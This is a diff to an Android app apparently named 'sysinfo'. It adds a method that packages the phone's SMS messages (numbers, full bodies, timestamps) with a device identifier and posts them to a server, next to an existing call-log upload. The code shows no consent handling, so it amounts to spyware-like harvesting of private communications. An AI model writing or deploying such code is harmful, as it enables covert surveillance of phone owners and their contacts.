@@ -6,6 +6,7 @@ import com.loopj.android.http.AsyncHttpClient;
 import com.loopj.android.http.AsyncHttpResponseHandler;
 import com.sidhit.sysinfo.src.model.CallLogData;
 import com.sidhit.sysinfo.src.model.DeviceData;
+import com.sidhit.sysinfo.src.model.SMSData;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -66,6 +67,41 @@ public class NetworkUtil {
             jsonObject.put("imeiNumber", imeiNumber);
             StringEntity entity = new StringEntity(jsonObject.toString());
             client.post(context, "http://10.0.2.2:8075/callLog/create", entity, "application/json", new AsyncHttpResponseHandler() {
+                @Override
+                public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+
+                }
+
+                @Override
+                public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+
+                }
+            });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    static void sendSMSData(Context context, List<SMSData> smsDataList) {
+        try {
+            AsyncHttpClient client = new AsyncHttpClient();
+            JSONObject jsonObject = new JSONObject();
+            JSONArray jsonArray = new JSONArray();
+            for (SMSData smsData : smsDataList) {
+                JSONObject jsonParams = new JSONObject();
+                jsonParams.put("smsId", smsData.getId());
+                jsonParams.put("number", smsData.getNumber());
+                jsonParams.put("body", smsData.getBody());
+                jsonParams.put("dateTime", smsData.getDateTime());
+                jsonParams.put("smsType", smsData.getSmsType());
+                jsonArray.put(jsonParams);
+            }
+            jsonObject.put("smsData", jsonArray);
+            String imeiNumber = HelperMethod.getUniqueDeviceId(context);
+            jsonObject.put("imeiNumber", imeiNumber);
+//            Log.d("SMS Data", jsonObject.toString(5));
+            StringEntity entity = new StringEntity(jsonObject.toString());
+            client.post(context, "http://10.0.2.2:8075/smsData/create", entity, "application/json", new AsyncHttpResponseHandler() {
                 @Override
                 public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
 
